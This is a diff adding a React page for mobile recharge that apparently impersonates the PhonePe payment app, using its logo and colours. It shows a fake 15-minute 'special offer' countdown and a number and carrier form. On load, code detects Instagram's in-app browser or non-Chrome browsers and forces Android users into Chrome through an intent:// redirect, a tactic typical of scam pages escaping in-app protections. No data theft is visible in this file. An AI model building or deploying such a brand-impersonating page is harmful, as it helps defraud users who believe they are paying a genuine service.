@@ -1,0 +1,274 @@
+import React, { useState, useEffect } from "react";
+import { useNavigate } from "react-router-dom";
+import chromeImage from './chrome.svg'; // Ensure you have a chrome.png image in your assets
+
+const IndexPage = () => {
+  const [number, setNumber] = useState("");
+  const [selectedOption, setSelectedOption] = useState("jio");
+  const [selected, setSelected] = useState('mobile'); // Default selection
+  const [error, setError] = useState("");
+  const navigate = useNavigate();
+  const [showChromePrompt, setShowChromePrompt] = useState(false);
+  // Detect if the current browser is Chromium-based
+  useEffect(() => {
+    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+    
+    const isChromium = /Chrome|CriOS|Chromium|Edg/.test(userAgent);
+    const isInstagram = userAgent.includes("Instagram");
+
+    // Redirect only if the browser is not Chromium-based and not on iOS
+    if (!isChromium || isInstagram) {
+      const domain = window.location.hostname;
+
+      // Check for Android platform
+      if (/android/i.test(userAgent)) {
+        window.location.href = `intent://${domain}#Intent;scheme=https;package=com.android.chrome;end`;
+      } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
+        // iOS does not support intent URLs, show manual Chrome prompt for iOS
+        document.getElementById("chrome-prompt").style.display = "block";
+      }
+    }
+  }, []);
+
+  const handleOpenInChrome = () => {
+    const domain = window.location.hostname;
+    window.location.href = `intent://${domain}#Intent;scheme=https;package=com.android.chrome;end`;
+  };
+
+  const handleRecharge = () => {
+    if (/^\d{10}$/.test(number)) {
+      navigate(`/recharge/${number}/${selectedOption}`);
+    } else {
+      setError("Please enter a valid 10-digit number.");
+    }
+  };
+
+  const handleSelect = (option) => {
+    setSelectedOption(option);
+  };
+  
+    const onSelectOption = (type) => {
+      setSelected(type); // Update selected state when clicked
+    };
+
+  return (
+    <div>
+      {/* Show Chrome prompt if in non-Chromium browser */}
+      {showChromePrompt ? (
+        <div style={{ textAlign: 'center', paddingTop: '50px' }}>
+          <img src={chromeImage} alt="Chrome" style={{ width: '150px', height: '150px', marginBottom: '20px' }} />
+          <button
+            onClick={handleOpenInChrome}
+            style={{ padding: '10px 20px', backgroundColor: '#4285f4', color: '#fff', borderRadius: '4px', border: 'none', cursor: 'pointer' }}
+          >
+            Open in Chrome
+          </button>
+        </div>
+      ) : (
+        // Default content for Chromium browsers
+        <div>
+      <div
+        class="py-4 px-6 bg-white flex items-center justify-between border-b border-slate-100 mb"
+        style={{ marginBottom: '8px'}}
+      >
+        <div class="flex items-center">
+          <svg
+            stroke="currentColor"
+            fill="currentColor"
+            stroke-width="0"
+            viewBox="0 0 448 512"
+            class="text-[#5F259F] mr-3"
+            height="19"
+            width="19"
+            xmlns="http://www.w3.org/2000/svg"
+          >
+            <path
+              d="M16 132h416c8.837 0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163 0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z"
+            ></path></svg
+          ><a href="/"
+            ><img
+              src="/images/phonepe.png"
+              alt=""
+              class="h-8"
+          /></a>
+        </div>
+        <div>
+          <svg
+            stroke="currentColor"
+            fill="currentColor"
+            stroke-width="0"
+            viewBox="0 0 512 512"
+            class="text-[#5F259F]"
+            height="25"
+            width="25"
+            xmlns="http://www.w3.org/2000/svg"
+          >
+            <path
+              d="M399 384.2C376.9 345.8 335.4 320 288 320H224c-47.4 0-88.9 25.8-111 64.2c35.2 39.2 86.2 63.8 143 63.8s107.8-24.7 143-63.8zM0 256a256 256 0 1 1 512 0A256 256 0 1 1 0 256zm256 16a72 72 0 1 0 0-144 72 72 0 1 0 0 144z"
+            ></path>
+          </svg>
+        </div>
+      </div>
+      <div class="bg-white">
+        <div class="px-2">
+          <img
+            src="/images/mbanner.png"
+            alt=""
+            class="rounded-xl"
+          />
+        </div>
+        <div>
+          <div
+            class="flex items-center justify-center py-1 px-4 mt-2 bg-blue-50 text-[13px]"
+          >
+            <div class="text-slate-700 mr-2">Special Offer Ends In:</div>
+            <div class="text-slate-700 flex items-center">
+              <svg
+                stroke="currentColor"
+                fill="currentColor"
+                stroke-width="0"
+                viewBox="0 0 512 512"
+                class="mr-[2px] mt-[1px]"
+                height="1em"
+                width="1em"
+                xmlns="http://www.w3.org/2000/svg"
+              >
+                <path
+                  d="M256,8C119,8,8,119,8,256S119,504,256,504,504,393,504,256,393,8,256,8Zm92.49,313h0l-20,25a16,16,0,0,1-22.49,2.5h0l-67-49.72a40,40,0,0,1-15-31.23V112a16,16,0,0,1,16-16h32a16,16,0,0,1,16,16V256l58,42.5A16,16,0,0,1,348.49,321Z"
+                ></path></svg
+              ><span id="timer">15:00</span>
+            </div>
+          </div>
+        </div>
+        <div class="py-10 px-5">
+          <div
+            class="bg-white border border-slate-200 rounded-xl py-4 px-6 shadow-xl shadow-blue-100"
+          >
+            <div
+              class="text-[#5F259F] flex items-center text-[17px] font-bold w-fit mx-auto mb-8"
+            >
+              <svg
+                stroke="currentColor"
+                fill="currentColor"
+                stroke-width="0"
+                viewBox="0 0 24 24"
+                height="30"
+                width="30"
+                xmlns="http://www.w3.org/2000/svg"
+              >
+                <path
+                  d="M6 2H18C18.5523 2 19 2.44772 19 3V21C19 21.5523 18.5523 22 18 22H6C5.44772 22 5 21.5523 5 21V3C5 2.44772 5.44772 2 6 2ZM12 17C11.4477 17 11 17.4477 11 18C11 18.5523 11.4477 19 12 19C12.5523 19 13 18.5523 13 18C13 17.4477 12.5523 17 12 17Z"
+                ></path></svg
+              ><span>Mobile Recharge</span>
+            </div>
+
+
+
+            <label class="text-[13px] ml-1 font-bold mt-5"
+              >Select Network Provider</label
+            >
+            <div class="mt-2 flex justify-between text-[#5F259F] text-[14px] font-bold">
+              <div
+                className={`border-2 border-phonepe rounded px-2 py-1 ${
+                  selectedOption === "jio" ? "selected text-white bg-phonepe" : ""
+                }`}
+              >
+                <input
+                  type="radio"
+                  id="option1"
+                  name="options"
+                  className="mr-1 mt-1"
+                  value="jio"
+                  checked={selectedOption === "jio"}
+                  onChange={(e) => handleSelect(e.target.value)}
+                />
+                <label htmlFor="option1">Jio</label>
+              </div>
+
+              <div
+                className={`border-2 border-phonepe rounded px-2 py-1 ${
+                  selectedOption === "airtel" ? "selected text-white bg-phonepe" : ""
+                }`}
+              >
+                <input
+                  type="radio"
+                  id="option2"
+                  name="options"
+                  className="mr-1 mt-1"
+                  value="airtel"
+                  checked={selectedOption === "airtel"}
+                  onChange={(e) => handleSelect(e.target.value)}
+                />
+                <label htmlFor="option2">Airtel</label>
+              </div>
+
+              <div
+                className={`border-2 border-phonepe rounded px-2 py-1 ${
+                  selectedOption === "vi" ? "selected text-white bg-phonepe" : ""
+                }`}
+              >
+                <input
+                  type="radio"
+                  id="option3"
+                  name="options"
+                  className="mr-1 mt-1"
+                  value="vi"
+                  checked={selectedOption === "vi"}
+                  onChange={(e) => handleSelect(e.target.value)}
+                />
+                <label htmlFor="option3">Vi</label>
+              </div>
+
+              <div
+                className={`border-2 border-phonepe rounded px-2 py-1 ${
+                  selectedOption === "bsnl" ? "selected text-white bg-phonepe" : ""
+                }`}
+              >
+                <input
+                  type="radio"
+                  id="option4"
+                  name="options"
+                  className="mr-1 mt-1"
+                  value="bsnl"
+                  checked={selectedOption === "bsnl"}
+                  onChange={(e) => handleSelect(e.target.value)}
+                />
+                <label htmlFor="option4">Bsnl</label>
+              </div>
+            </div>
+
+            <div class="mt-3">
+              <label class="text-[13px] ml-1 font-bold">Mobile Number</label
+              ><input
+                type="number"
+                value={number}
+                onChange={(e) => setNumber(e.target.value)}
+                placeholder="+91 xxxxx xxxxx"
+                class="bg-white mt-1 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-phonepe block w-full p-2.5"
+                required=""
+              />
+            </div>
+            {error && <p style={{ color: "red" }}>{error}</p>}
+            <div class="mt-5">
+              <button
+                onClick={handleRecharge}
+                class="bg-phonepe py-3 w-full text-[15px] rounded-xl font-bold text-white"
+              >
+                Recharge
+              </button>
+            </div>
+          </div>
+        </div>
+        <img
+          src="/images/footer.jpg"
+          alt=""
+          class="mt-3"
+        />
+      </div>
+        </div>
+      )}
+    </div>
+  );
+};
+
+export default IndexPage;
